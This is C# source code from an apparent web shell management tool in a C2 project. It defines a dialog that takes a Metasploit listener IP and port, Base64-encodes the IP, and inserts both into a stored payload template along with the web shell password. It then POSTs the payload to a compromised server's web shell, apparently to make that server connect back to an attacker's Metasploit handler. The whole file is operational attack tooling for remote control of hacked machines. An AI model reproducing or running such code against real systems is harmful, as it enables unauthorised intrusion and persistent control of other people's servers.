using C2.Controls;
using C2.Core;
using C2.Utils;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace C2.Business.CastleBravo.WebShellTool
{
    partial class MSFSet : StandardDialog
    {
        private string MSF { get => msfTextBox.Text.Trim(); set => msfTextBox.Text = value; }
        private readonly WebShellTaskConfig task;
        private ProxySetting proxy;
        public MSFSet(WebShellTaskConfig taskConfig, ProxySetting proxy,FormViewSet viewSet)
        {
            InitializeComponent();
            task = taskConfig;
            this.proxy = proxy;
            MSF = Global.MSFHost;
            UpdateFormView(viewSet);


        }
        private void UpdateFormView(FormViewSet viewSet)
        {
            if (viewSet == null)
                return;
            this.Text = viewSet.Title;
            this.addr.Text = viewSet.SubTitle;
            this.help1.Text = viewSet.TipInfo;

        }
        protected override bool OnOKButtonClick()
        {
            string addr = this.addr.Text.Trim(':');
            if (MSF.IsNullOrEmpty())
            {
                HelpUtil.ShowMessageBox(string.Format("【{0}】不能为空。", addr));
                return false;
            }
            string RegexStr = @"((\d{1,3}\.){3}\d{1,3}):(\d{3,5})";
            Match mc = Regex.Match(MSF.Trim(), RegexStr);
            
            if (mc.Groups.Count < 3)
            {
                HelpUtil.ShowMessageBox(string.Format("【{0}】格式有误。", addr));
                return false;
            }
            Global.MSFHost = MSF;
            string encodeIP = ST.EncodeBase64(mc.Groups[1].Value);
            string port = mc.Groups[3].Value;
            string payload = string.Format(Global.MSFPayload, task.Password, port, encodeIP);
            Task<string> t = Task.Run(() => PostPayload(payload));
            return base.OnOKButtonClick();
        }
        
        private string PostPayload(string payload)
        {
            try 
            { 
                return WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 900000, proxy);
            }
            catch
            {
                return string.Empty;
            }
            
        }
    }
    internal class FormViewSet
    {
        public string Title { get; set; } = "MSF配置";
        public string SubTitle { get; set; } = "MSF地址:";
        public string TipInfo { get; set; } = "输入MSF地址,例如:";

    }

}
